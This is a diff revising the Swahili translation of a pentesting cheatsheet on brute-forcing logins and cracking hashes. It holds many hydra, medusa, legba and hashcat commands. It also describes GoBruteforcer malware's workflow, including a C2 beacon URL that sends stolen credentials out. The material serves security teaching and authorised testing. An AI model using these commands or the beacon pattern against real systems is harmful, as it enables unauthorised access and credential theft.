@@ -1,4 +1,4 @@
-# Brute Force - CheatSheet
+# Brute Force - Karatasi ya Marejeleo
 
 {{#include ../banners/hacktricks-training.md}}
 
@@ -19,9 +19,9 @@
 - [**https://many-passwords.github.io/**](https://many-passwords.github.io)
 - [**https://theinfocentric.com/**](https://theinfocentric.com/)
 
-## **Tengeneza Kamusi Zako**
+## **Tengeneza Kamusi Zako Mwenyewe**
 
-Tafuta taarifa nyingi iwezekanavyo kuhusu lengo na utengeneze kamusi maalum. Zana zinazoweza kusaidia:
+Kusanya taarifa nyingi uwezavyo kuhusu lengwa, kisha tengeneza kamusi maalum. Zana zinazoweza kusaidia:
 
 ### Crunch
 
@@ -36,7 +36,7 @@ crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha # Only length 4 using chars
 crunch 6 8 -t ,@@^^%%
 ```
 
-### Wordlist zinazotokana na tovuti
+### Orodha za maneno zinazotokana na tovuti
 
 ```bash
 # Cewl gets words from the victims page
@@ -51,7 +51,7 @@ cat /path/to/js-urls.txt | python3 getjswords.py
 
 ### [CUPP](https://github.com/Mebus/cupp)
 
-Tengeneza nywila kulingana na unachokijua kuhusu mwathiriwa (majina, tarehe...)
+Tengeneza nywila kulingana na unavyomfahamu mwathiriwa (majina, tarehe...)
 
 ```
 python3 cupp.py -h
@@ -59,7 +59,7 @@ python3 cupp.py -h
 
 ### [Wister](https://github.com/cycurity/wister)
 
-Zana ya kutengeneza wordlist, inayokuwezesha kutoa seti ya maneno na kuunda tofauti nyingi kutokana nayo, ili kutengeneza wordlist ya kipekee na inayofaa kwa target maalum.
+Zana ya kutengeneza orodha ya maneno inayokuruhusu kutoa seti ya maneno na kuunda matoleo mbalimbali kutokana nayo, hivyo kutengeneza orodha ya kipekee na inayofaa kwa kutumia dhidi ya lengwa mahususi.
 
 ```bash
 python3 wister.py -w jane doe 2022 summer madrid 1998 -c 1 2 3 4 5 -o wordlist.lst
@@ -97,17 +97,17 @@ Finished in 0.920s.
 
 ## Mtiririko wa kazi wa bruteforcer ya mtandao mzima (mafunzo kutoka kwa scanners zinazotumia Go)
 
-Tabia zifuatazo zilionekana katika mtiririko wa kazi wa scanning wa malware ya GoBruteforcer; thamani halisi hutegemea sampuli.<sup>[[1]](#references)</sup>
+Tabia zifuatazo zilionekana katika mtiririko wa kazi wa uchanganuzi wa malware ya GoBruteforcer; thamani halisi hutegemea sampuli.<sup>[[1]](#references)</sup>
 
-- Dumisha **worker pools zilizoboreshwa kwa usanifu** (kwa mfano, workers 95 wanaofanya kazi kwa wakati mmoja kwenye `x86_64/arm64`, 85 kwenye `i686`, 35 kwenye `armv5tel`, na 50 kwa chaguomsingi kwenye usanifu mwingine), kagua workers walio hai kila sekunde, na uanzishe wengine wakipungua chini ya lengo; kila worker hushughulikia target IP moja pekee kisha huacha kufanya kazi.
-- Tengeneza **IPv4 za umma za nasibu** lakini uondoe safu zisizoweza kuelekezwa waziwazi na baadhi ya safu ambazo operator huchagua kuepuka: RFC1918, `100.64.0.0/10`, `127.0.0.0/8`, `0.0.0.0/8`, `169.254.0.0/16`, `198.18.0.0/15`, multicast `>=224.0.0.0/4`, `/8` zinazotumiwa sana na cloud (`3/15/16/56`) na `/8` zinazohusishwa na DoD (`6/7/11/21/22/26/28/29/30/33/55/214/215`).
-- **Chunguza service port** kwa timeout fupi (~2s) kabla ya kujaribu **cleartext logins** (FTP/21, MySQL/3306, Postgres/5432, phpMyAdmin kupitia HTTP/80), na utumie **orodha ndogo ya credentials iliyojengewa ndani** ikiwa upakuaji wa credentials za C2 hautafaulu.
-- **Hamisha matokeo yaliyopatikana** kupitia HTTP GET beacons ndogo kama `http://<c2>:9090/pst?i=<ip>&c=<svc_code>&u=<user>&p=<pass>&e=<extra>` (service codes kama `1=PMA`, `2=MySQL`, `3=FTP`, `4=Postgres`), huku ukitumia tena User-Agent ya kawaida ya browser ili isionekane tofauti.
-- **phpMyAdmin spray** inaweza kujaribu kwa bruteforce takriban njia 80 zinazowezekana kwa `GET /index.php?lang=en`, kugundua viashiria vya PMA (`pmahomme` theme/`phpmyadmin.css`/`navigation.php`) na kuchanganua `codemirror.css?v=X.Y.Z` ili kuchagua njia ya auth: matoleo `<4.9` hukubali vigezo vya GET `pma_username`/`pma_password`; matoleo `>=4.9` hutumia POST pamoja na `server=1`, CSRF `token`, na credentials hizo hizo.
+- Dumisha **makundi ya worker yaliyotunishwa kulingana na usanifu** (kwa mfano, workers 95 wanaofanya kazi kwa pamoja kwenye `x86_64/arm64`, 85 kwenye `i686`, 35 kwenye `armv5tel`, na 50 kwa chaguomsingi kwenye usanifu mwingine), kagua workers walio hai kila sekunde, na uanzishe wengine badala yao idadi inaposhuka chini ya lengo; kila worker hushughulikia IP moja tu lengwa kabla ya kutoka.
+- Tengeneza **IPv4 za umma za nasibu**, lakini ondoa zilizo wazi kuwa hazielekezwi na baadhi ya masafa ambayo waendeshaji wamechagua kuepuka: RFC1918, `100.64.0.0/10`, `127.0.0.0/8`, `0.0.0.0/8`, `169.254.0.0/16`, `198.18.0.0/15`, multicast `>=224.0.0.0/4`, masafa ya `/8` yenye matumizi mengi ya cloud (`3/15/16/56`) na masafa ya `/8` yanayohusishwa na DoD (`6/7/11/21/22/26/28/29/30/33/55/214/215`).
+- **Jaribu port ya huduma** kwa timeout fupi (~2s) kabla ya kujaribu **kuingia kwa cleartext** (FTP/21, MySQL/3306, Postgres/5432, phpMyAdmin kupitia HTTP/80), na tumia orodha ndogo ya credentials iliyojengewa ndani ikiwa upataji wa credentials kutoka C2 hautafaulu.
+- **Toa taarifa za mafanikio nje** kupitia HTTP GET beacon ndogo kama `http://<c2>:9090/pst?i=<ip>&c=<svc_code>&u=<user>&p=<pass>&e=<extra>` (misimbo ya huduma kama `1=PMA`, `2=MySQL`, `3=FTP`, `4=Postgres`), huku ukitumia tena User-Agent ya kawaida ya browser ili kuficha shughuli.
+- **phpMyAdmin spray** inaweza kujaribu kwa brute-force takriban paths 80 zinazowezekana kwa kutumia `GET /index.php?lang=en`, kutambua alama za PMA (`pmahomme` theme/`phpmyadmin.css`/`navigation.php`) na kuchanganua `codemirror.css?v=X.Y.Z` ili kuchagua njia ya auth: matoleo `<4.9` hukubali vigezo vya GET `pma_username`/`pma_password`; matoleo `>=4.9` hutumia POST pamoja na `server=1`, CSRF `token`, na credentials zilezile.
 
-## Services
+## Huduma
 
-Zimepangwa kialfabeti kulingana na jina la service.
+Zimepangwa kwa alfabeti kulingana na jina la huduma.
 
 ### AFP
 
@@ -127,7 +127,7 @@ msf> run
 nmap --script ajp-brute -p 8009 <IP>
 ```
 
-### AMQP (ActiveMQ, RabbitMQ, Qpid, JORAM na Solace)
+### AMQP (ActiveMQ, RabbitMQ, Qpid, JORAM and Solace)
 
 ```bash
 legba amqp --target localhost:5672 --username admin --password data/passwords.txt [--amql-ssl]
@@ -177,7 +177,7 @@ medusa -u root -P 500-worst-passwords.txt -h <IP> -M ftp
 legba ftp --username admin --password wordlists/passwords.txt --target localhost:21
 ```
 
-### HTTP Brute ya Jumla
+### Brute Force ya Jumla ya HTTP
 
 #### [**WFuzz**](../pentesting-web/web-tool-wfuzz.md)
 
@@ -197,16 +197,16 @@ legba http.ntlm1 --domain example.org --workstation client --username admin --pa
 legba http.ntlm2 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
 ```
 
-### HTTP - Fomu ya POST
+### HTTP - Fomu ya Post
 
 ```bash
 hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
 # Use https-post-form mode for https
 ```
 
-Kwa http**s** unapaswa kubadilisha kutoka "http-post-form" hadi "**https-post-form"**
+Kwa http**s** unapaswa kubadilisha kutoka "http-post-form" hadi "**https-post-form"
 
-### **HTTP - CMS --** (W)ordpress, (J)oomla or (D)rupal or (M)oodle
+### **HTTP - CMS --** (W)ordpress, (J)oomla au (D)rupal au (M)oodle
 
 ```bash
 cmsmap -f W/J/D/M -u a -p a https://wordpress.com
@@ -351,7 +351,7 @@ Ili kutumia **oracle_login** pamoja na **patator**, unahitaji **kusakinisha**:
 pip3 install cx_Oracle --upgrade
 ```
 
-[Offline bruteforce ya hash ya OracleSQL](https://github.com/carlospolop/hacktricks/blob/master/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force) (**versions 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2,** and **11.2.0.3**):
+[Offline OracleSQL hash bruteforce](https://github.com/carlospolop/hacktricks/blob/master/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force) (**versions 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2,** and **11.2.0.3**):
 
 ```bash
  nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n 10.11.21.30
@@ -384,7 +384,7 @@ legba pgsql --username admin --password wordlists/passwords.txt --target localho
 
 ### PPTP
 
-Unaweza kupakua kifurushi cha `.deb` cha kusakinisha kutoka [https://http.kali.org/pool/main/t/thc-pptp-bruter/](https://http.kali.org/pool/main/t/thc-pptp-bruter/)
+Unaweza kupakua kifurushi cha `.deb` ili kusakinisha kutoka [https://http.kali.org/pool/main/t/thc-pptp-bruter/](https://http.kali.org/pool/main/t/thc-pptp-bruter/)
 
 ```bash
 sudo dpkg -i thc-pptp-bruter*.deb #Install the package
@@ -511,13 +511,13 @@ legba ssh --username admin --password wordlists/passwords.txt --target localhost
 legba ssh --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
 ```
 
-#### Funguo dhaifu za SSH / PRNG inayotabirika ya Debian
+#### SSH keys dhaifu / PRNG inayotabirika ya Debian
 
-Baadhi ya mifumo ina dosari zinazojulikana katika seed ya nasibu inayotumiwa kuzalisha nyenzo za kriptografia. Hii inaweza kusababisha keyspace kupungua sana, na hivyo kuruhusu kufanya bruteforce kwa kutumia zana kama [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute). Seti za funguo dhaifu zilizozalishwa mapema zinapatikana pia, kama [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh).
+Baadhi ya mifumo ina dosari zinazojulikana katika seed ya nasibu inayotumiwa kuzalisha nyenzo za kriptografia. Hii inaweza kusababisha keyspace kupungua sana, na hivyo kuruhusu brute force kwa kutumia zana kama [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute). Seti za keys dhaifu zilizozalishwa awali zinapatikana pia, kama vile [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh).
 
 ### STOMP (ActiveMQ, RabbitMQ, HornetQ and OpenMQ)
 
-Itifaki ya maandishi ya STOMP ni itifaki ya ujumbe inayotumiwa sana ambayo **inaruhusu mawasiliano na mwingiliano usio na vikwazo na huduma maarufu za foleni za ujumbe** kama RabbitMQ, ActiveMQ, HornetQ, na OpenMQ. Inatoa mbinu sanifu na bora ya kubadilishana ujumbe na kutekeleza shughuli mbalimbali za ujumbe.
+Protocol ya maandishi ya STOMP ni protocol ya ujumbe inayotumika sana, **inayowezesha mawasiliano na mwingiliano usio na usumbufu na huduma maarufu za foleni za ujumbe** kama vile RabbitMQ, ActiveMQ, HornetQ, na OpenMQ. Inatoa njia sanifu na bora ya kubadilishana ujumbe na kutekeleza shughuli mbalimbali za ujumbe.
 
 ```bash
 legba stomp --target localhost:61613 --username admin --password data/passwords.txt
@@ -564,23 +564,23 @@ crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
 ```
 
 
-## Ndani
+## Ndani ya kifaa
 
-### Hifadhidata za mtandaoni za cracking
+### Hifadhidata za mtandaoni za kuvunja nywila
 
 - [~~http://hashtoolkit.com/reverse-hash?~~](http://hashtoolkit.com/reverse-hash?) (MD5 & SHA1)
-- [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php) (MSCHAPv2/PPTP-VPN/NetNTLMv1 with/without ESS/SSP and with any challenge's value)
-- [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (Hashes, WPA2 captures, and archives MSOffice, ZIP, PDF...)
+- [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php) (MSCHAPv2/PPTP-VPN/NetNTLMv1 yenye au bila ESS/SSP na kwa thamani yoyote ya challenge)
+- [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (Hashes, captures za WPA2 na archive za MSOffice, ZIP, PDF...)
 - [https://crackstation.net/](https://crackstation.net) (Hashes)
 - [https://md5decrypt.net/](https://md5decrypt.net) (MD5)
-- [https://gpuhash.me/](https://gpuhash.me) (Hashes and file hashes)
+- [https://gpuhash.me/](https://gpuhash.me) (Hashes na hashes za faili)
 - [https://hashes.org/search.php](https://hashes.org/search.php) (Hashes)
 - [https://www.cmd5.org/](https://www.cmd5.org) (Hashes)
 - [https://hashkiller.co.uk/Cracker](https://hashkiller.co.uk/Cracker) (MD5, NTLM, SHA1, MySQL5, SHA256, SHA512)
 - [https://www.md5online.org/md5-decrypt.html](https://www.md5online.org/md5-decrypt.html) (MD5)
 - [http://reverse-hash-lookup.online-domain-tools.com/](http://reverse-hash-lookup.online-domain-tools.com)
 
-Angalia hili kabla ya kujaribu kufanya brute force ya Hash.
+Angalia hili kabla ya kujaribu kufanya brute force kwenye Hash.
 
 ### ZIP
 
@@ -602,7 +602,7 @@ hashcat.exe -m 13600 -a 0 .\hashzip.txt .\wordlists\rockyou.txt
 
 #### Known plaintext zip attack
 
-Unahitaji kujua **plaintext** (au sehemu ya plaintext) **ya faili iliyo ndani** ya zip iliyosimbwa kwa njia fiche. Unaweza kukagua **majina ya faili na ukubwa wa faili zilizo ndani** ya zip iliyosimbwa kwa njia fiche kwa kuendesha: **`7z l encrypted.zip`**\
+Unahitaji kujua **plaintext** (au sehemu ya plaintext) **ya faili iliyo ndani** ya zip iliyosimbwa kwa njia fiche. Unaweza kuangalia **majina ya faili na ukubwa wa faili zilizo ndani** ya zip iliyosimbwa kwa njia fiche kwa kuendesha: **`7z l encrypted.zip`**\
 Pakua [**bkcrack** ](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0)kwenye ukurasa wa matoleo.
 
 ```bash
@@ -687,7 +687,7 @@ hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
 
 ### Picha ya Lucks
 
-#### Mbinu 1
+#### Mbinu ya 1
 
 Sakinisha: [https://github.com/glv2/bruteforce-luks](https://github.com/glv2/bruteforce-luks)
 
@@ -719,7 +719,7 @@ Mafunzo mengine ya Luks BF: [http://blog.dclabs.com.br/2020/03/bruteforcing-linu
 dbuser:$mysqlna$112233445566778899aabbccddeeff1122334455*73def07da6fba5dcc1b19c918dbd998e0d1f3f9d
 ```
 
-### Ufunguo binafsi wa PGP/GPG
+### Ufunguo wa faragha wa PGP/GPG
 
 ```bash
 gpg2john private_pgp.key #This will generate the hash and save it in a file
@@ -732,13 +732,13 @@ john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
 
 ### DPAPI Master Key
 
-Tumia [https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py) kisha utumie john
+Tumia [https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py) kisha john
 
-### Safu Wima Iliyolindwa kwa Nenosiri ya Open Office
+### Safu Wima ya Open Office Iliyolindwa kwa Nenosiri
 
 Ikiwa una faili ya xlsx yenye safu wima iliyolindwa kwa nenosiri, unaweza kuiondoa kinga:
 
-- **Pakia kwenye Google Drive** na nenosiri litaondolewa kiotomatiki
+- **Pakia faili hiyo kwenye google drive** na nenosiri litaondolewa kiotomatiki
 - Ili **kuliondoa** **mwenyewe**:
 
 ```bash
@@ -770,22 +770,22 @@ hash-identifier
 > <HASH>
 ```
 
-### Orodha za maneno
+### Wordlist
 
 - **Rockyou**
 - [**Probable-Wordlists**](https://github.com/berzerk0/Probable-Wordlists)
 - [**Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/wordlists)
 - [**Seclists - Passwords**](https://github.com/danielmiessler/SecLists/tree/master/Passwords)
 
-### **Zana za Kutengeneza Orodha za Maneno**
+### **Zana za Kutengeneza Wordlist**
 
-- [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** Kizalishaji cha hali ya juu cha keyboard-walk chenye herufi za msingi, keymap na njia zinazoweza kusanidiwa.
+- [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** Generator ya keyboard-walk ya kina yenye herufi msingi, keymap na njia zinazoweza kusanidiwa.
 
 ```bash
 kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction-changes.route -o D:\Tools\keywalk.txt
 ```
 
-### Mabadiliko ya John
+### John mutation
 
 Soma _**/etc/john/john.conf**_ na uisanidi.
 
@@ -796,21 +796,21 @@ john --wordlist=words.txt --rules=all --stdout > w_mutated.txt #Apply all rules
 
 ### Hashcat
 
-#### Mashambulizi ya Hashcat
+#### Hashcat attacks
 
-- **Shambulio la Wordlist** (`-a 0`) lenye rules
+- **Wordlist attack** (`-a 0`) with rules
 
-**Hashcat** tayari inakuja na **folda yenye rules**, lakini unaweza kupata [**rules nyingine zinazovutia hapa**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules).
+**Hashcat** tayari inakuja na **folder yenye rules**, lakini unaweza kupata [**rules nyingine za kuvutia hapa**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules).
 
 ```
 hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt .\rockyou.txt -r rules\best64.rule
 ```
 
-#### Eleza na fafanua faili za rule
+#### Eleza na chambua faili za rules
 
-Rules za Hashcat hutekeleza opcodes kutoka kushoto kwenda kulia. Ni rahisi kutafsiri vibaya utaratibu huu operesheni zinapotumika kwenye nafasi ya sifuri: `^e ^h ^t` huongeza `e`, kisha `h`, kisha `t` mwanzoni, na hivyo hubadilisha `password` kuwa `thepassword`. Ubadilishaji ni ulinganisho wa byte unaozingatia herufi kubwa na ndogo, kwa hivyo rule kama `sa@` haibadilishi chochote kwa `A` kubwa. Jaribu rules usizozifahamu kwa maneno msingi yanayowakilisha herufi ndogo, herufi kubwa na mchanganyiko wa herufi hizo kabla ya kutumia muda wa GPU kuziendesha.<sup>[[6]](#references)[[9]](#references)</sup>
+Hashcat rules hutekeleza opcodes kutoka kushoto kwenda kulia. Hili ni rahisi kulisoma vibaya shughuli zinapofanyika katika nafasi ya sifuri: `^e ^h ^t` huongeza `e` mwanzoni, kisha `h`, halafu `t`, na hivyo kubadilisha `password` kuwa `thepassword`. Ubadilishaji hulinganisha baiti kwa kuzingatia herufi kubwa na ndogo, kwa hiyo rule kama `sa@` haibadilishi chochote kwa herufi kubwa `A`. Jaribu rules usizozifahamu dhidi ya maneno ya msingi yanayowakilisha herufi ndogo, herufi kubwa, na mchanganyiko wa herufi kubwa na ndogo kabla ya kutumia muda wa GPU kuzitekeleza.<sup>[[6]](#references)[[9]](#references)</sup>
 
-[HashcatRosetta](https://github.com/bandrel/HashcatRosetta) inaweza kuonyesha kila candidate ya kati na kutoa muhtasari wa usambazaji wa opcode katika faili zima la rules. Hesabu tuli za opcode zinaonyesha iwapo faili huongeza herufi zaidi mwishoni au mwanzoni, hubadilisha herufi, au huzikata. Haziwezi kuthibitisha kuwa rule itavunja nenosiri, lakini husaidia kuchagua seti ya rules inayolingana na mifumo ya nenosiri iliyozingatiwa kwa kundi lengwa.<sup>[[6]](#references)[[9]](#references)</sup>
+[HashcatRosetta](https://github.com/bandrel/HashcatRosetta) inaweza kuonyesha kila candidate ya kati na kufupisha mgawanyo wa opcode wa faili nzima ya rules. Idadi tuli ya opcodes huonyesha iwapo faili huongeza, huweka mwanzoni, hubadilisha, au hukata herufi mara nyingi. Hazithibitishi kuwa rule itapata password, lakini husaidia kuchagua rule set inayolingana na mifumo ya password iliyozingatiwa katika kundi lengwa.<sup>[[6]](#references)[[9]](#references)</sup>
 
 ```bash
 uv tool install git+https://github.com/bandrel/HashcatRosetta.git
@@ -818,9 +818,9 @@ hashcat-rosetta --explain '^e ^h ^t' --baseword password
 hashcat-rosetta rules.rule --analyze-rules
 ```
 
-#### Punguza rules zisizohitajika kwa kutumia debug logs
+#### Punguza rules zinazojirudia kwa kutumia debug logs
 
-Hashcat debug mode huhifadhi mabadiliko ya rules kando na matokeo ya kawaida ya hali na matokeo. Mode `4` huandika `baseword:rule:candidate`; mode `5` huongeza source wordlist. Weka `--debug-file` wazi kila wakati. Vinginevyo, Hashcat hufungua `hashcat.debugfile` kwenye profile directory yake, na kuelekeza stdout hunasa console stream badala ya rekodi hizi. Debug files hufunguliwa katika append mode, kwa hivyo futa au zungusha faili ya zamani kabla ya kipimo kipya, na ilinde kwa sababu ina basewords na candidates zilizo katika maandishi wazi.<sup>[[7]](#references)[[8]](#references)[[9]](#references)</sup>
+Hashcat debug mode huhifadhi mabadiliko ya rules kando na matokeo ya kawaida ya hali na matokeo. Mode `4` huandika `baseword:rule:candidate`; mode `5` huongeza wordlist chanzo. Weka `--debug-file` wazi kila wakati. Vinginevyo, Hashcat hufungua `hashcat.debugfile` katika directory ya profile yake, na kuelekeza stdout kunasa mkondo wa console badala ya rekodi hizi. Debug files hufunguliwa katika append mode, kwa hivyo futa au zungusha faili ya zamani kabla ya kipimo kipya na ilinde kwa sababu ina basewords na candidates zilizo katika maandishi wazi.<sup>[[7]](#references)[[8]](#references)[[9]](#references)</sup>
 
 ```bash
 rm -f debug.txt
@@ -832,12 +832,12 @@ hashcat-rosetta debug.txt --wordlists --detail
 hashcat-rosetta debug.txt --export report.json --format json
 ```
 
-Tumia `frequency` kupata rules zinazotumika mara nyingi zaidi, `basewords` kupima idadi ya ingizo tofauti zinazofunikwa, na `candidates` kuhesabu matokeo tofauti. Kupanga candidates kwa nafasi kwa kawaida ndiyo njia bora ya kuanza kupunguza rules, kwa sababu rule inayotumika mara nyingi bado inaweza kugeuza ingizo nyingi kuwa candidates zinazofanana. Nakili rules zenye thamani ya juu zaidi kwenye faili ndogo, ziendeshe tena dhidi ya hashes zilizosalia, na ulinganishe ripoti za kila uendeshaji. Mode `5` pia huonyesha kama kila source wordlist inachangia basewords zenye manufaa; lazimisha uchanganuzi kwa kutumia `--debug-mode 4` au `--debug-mode 5` ikiwa koloni kwenye data zinafanya utambuzi wa kiotomatiki usiwe wazi.<sup>[[6]](#references)[[9]](#references)</sup>
+Tumia `frequency` kupata rules zinazotumika mara nyingi zaidi, `basewords` kupima idadi ya inputs tofauti zinazofunikwa, na `candidates` kuhesabu outputs tofauti. Kupanga candidates kwa umuhimu kwa kawaida ndiyo njia bora ya kuanza kupunguza idadi, kwa sababu hata rule inayotumika mara nyingi inaweza kufanya inputs nyingi zitoe candidates zinazojirudia. Nakili rules zenye thamani kubwa zaidi kwenye faili ndogo, ziendeshe tena dhidi ya hashes zilizobaki, na linganisha ripoti za kila run. Mode `5` pia huonyesha kama kila source wordlist inachangia basewords zenye manufaa; lazimisha uchanganuzi kwa kutumia `--debug-mode 4` au `--debug-mode 5` wakati koloni kwenye data zinafanya ugunduzi wa kiotomatiki usiwe wazi.<sup>[[6]](#references)[[9]](#references)</sup>
 
 - **Wordlist combinator** attack
 
 Inawezekana **kuunganisha wordlists 2 kuwa 1** kwa kutumia hashcat.\
-Ikiwa list 1 ilikuwa na neno **"hello"** na ya pili ilikuwa na mistari 2 yenye maneno **"world"** na **"earth"**. Maneno `helloworld` na `helloearth` yatazalishwa.
+Ikiwa list 1 ina neno **"hello"** na ya pili ina mistari 2 yenye maneno **"world"** na **"earth"**, maneno `helloworld` na `helloearth` yatatengenezwa.
 
 ```bash
 # This will combine 2 wordlists
@@ -850,11 +850,11 @@ hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt
 hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt -j $- -k $!
 ```
 
-#### Grammar-driven combinator attacks (mfano wa Office uliosimbwa kwa njia fiche)
+#### Mashambulizi ya combinator yanayoongozwa na sarufi (mfano wa Office iliyosimbwa)
 
-Nenosiri linaweza kuwa refu na kuwa na makundi kadhaa ya herufi, lakini bado likawa na **nafasi ndogo ya utafutaji halisi** linapofuata sarufi inayojulikana. Kwa hati ya Office iliyosimbwa kwa njia fiche na kupatikana wakati wa tathmini iliyoidhinishwa, `office2john.py` hutoa rekodi ya uthibitishaji wa nenosiri; hii huwezesha kubashiri nenosiri ndani ya kifaa bila kufungiwa nje, kupunguzwa kwa kasi ya majaribio, au MFA. Haiuki usimbaji fiche wa hati.<sup>[[2]](#references)[[5]](#references)</sup>
+Nenosiri linaweza kuwa refu na kuwa na aina kadhaa za herufi, lakini bado likawa na **nafasi finyu ya utafutaji inayotumika** linapofuata sarufi inayojulikana. Kwa hati ya Office iliyosimbwa iliyopatikana wakati wa tathmini iliyoidhinishwa, `office2john.py` hutoa rekodi ya uthibitishaji wa nenosiri; hii huwezesha kubashiri nenosiri ndani ya mfumo bila kufungiwa nje, kupunguziwa kasi au kuhitaji MFA. Haiwezi kukwepa usimbaji fiche wa hati.<sup>[[2]](#references)[[5]](#references)</sup>
 
-Ondoa sehemu ya jina la faili ambayo John huongeza ili Hashcat ipokee kithibitishaji pekee:<sup>[[2]](#references)</sup>
+Ondoa sehemu ya jina la faili ambayo John huweka mwanzoni ili Hashcat ipokee verifier pekee:<sup>[[2]](#references)</sup>
 
 ```bash
 python3 /path/to/office2john.py secrets.xlsx | sed 's/^[^:]*://' > office.hash
@@ -863,7 +863,7 @@ head -c 40 office.hash; echo
 
 Chagua `-m` kulingana na kiambishi awali kilichotolewa, si kiendelezi cha faili. Hashcat huweka `$office$*2007*`, `$office$*2010*`, na `$office$*2013*` kwenye modes `9400`, `9500`, na `9600`; rekodi za zamani za `$oldoffice$0/$1` na `$oldoffice$3/$4` hutumia modes `9700` na `9800`, mtawalia.<sup>[[3]](#references)</sup>
 
-Ikiwa taarifa kutoka kwa matumizi ya tena ya nenosiri, sera, vidokezo, au watu wanaomfahamu mtumiaji zinaonyesha muundo wa sarufi kama `<word><number><optional !><word>`, tengeneza kiambishi awali kinachoweza kuorodheshwa kivyake kama kamusi ya upande wa kushoto. Mfano huu hujaribu nambari `0` hadi `99`; badilisha masafa na mabadiliko kulingana na ushahidi kutoka kwenye tathmini.<sup>[[5]](#references)</sup>
+Ikiwa taarifa kutoka kwa matumizi tena ya nywila, sera, vidokezo, au watu wanaomfahamu mtumiaji zinaonyesha muundo kama `<word><number><optional !><word>`, tengeneza kamusi ya upande wa kushoto kutoka kwa kiambishi awali kinachoweza kuorodheshwa kivyake. Mfano huu hujaribu nambari `0` hadi `99`; badilisha masafa na mabadiliko kulingana na ushahidi kutoka kwenye tathmini.<sup>[[5]](#references)</sup>
 
 ```bash
 while IFS= read -r word; do
@@ -873,13 +873,13 @@ while IFS= read -r word; do
 done < words.txt > wordsAndNumbers.txt
 ```
 
-Hashcat attack mode `1` huongeza kila mstari wa dictionary ya kulia mwishoni mwa kila mstari wa dictionary ya kushoto, kwa hivyo faili zenye mistari `L` na `R` huzalisha wagombea `L × R` kabla ya kutumia rules zozote. Amri ifuatayo imekusudiwa mahsusi kwa rekodi ya zamani ya `$oldoffice$3/$4`; badilisha mode kwa miundo mingine ya Office.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>
+Hashcat attack mode `1` huongeza kila mstari wa dictionary ya kulia kwenye kila mstari wa dictionary ya kushoto, hivyo faili zenye mistari `L` na `R` huzalisha wagombea `L × R` kabla ya rules zozote kutumika. Amri ifuatayo imekusudiwa mahususi kwa rekodi ya zamani ya `$oldoffice$3/$4`; badilisha mode kwa miundo mingine ya Office.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>
 
 ```bash
 hashcat -m 9800 -a 1 office.hash wordsAndNumbers.txt english-88k-upper.txt
 ```
 
-Mchoro huu wa preprocessing unaweza kutumika pia kwa miundo mingine inayoweza kuthibitishwa offline: orodhesha tu uwezekano unaokubalika wa herufi kubwa/ndogo, tarehe, vitenganishi, tarakimu au alama za uakifishaji kwa sehemu moja, kisha uiunganishe na sehemu iliyobaki badala ya kujaribu kwa brute force urefu kamili unaodhaniwa.<sup>[[4]](#references)[[5]](#references)</sup>
+Muundo huu wa preprocessing unaweza kutumika kwa fomati nyingine zinazoweza kuthibitishwa offline: orodhesha tu matumizi yanayowezekana ya herufi kubwa na ndogo, tarehe, vitenganishi, tarakimu au alama za uakifishaji kwa kipengele kimoja, kisha ukichanganye na kipengele kilichosalia badala ya kujaribu kwa nguvu urefu kamili unaodhaniwa.<sup>[[4]](#references)[[5]](#references)</sup>
 
 - **Mask attack** (`-a 3`)
 
@@ -917,13 +917,13 @@ hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt .\masks.hcmask
 
 #### Thibitisha faili za `.hcmask` kabla ya kuendesha
 
-Mstari wenye hitilafu unaweza kupuuzwa katikati ya masks halali, kwa hivyo thibitisha faili zima na keyspace yake inayokadiriwa kabla ya kuanzisha shambulio. HashcatRosetta huripoti mstari wenye hitilafu na kurudisha hali isiyo sifuri ikiwa mask yoyote si halali, jambo linalofanya ukaguzi huu ufae kwa scripts au CI.<sup>[[6]](#references)[[9]](#references)</sup>
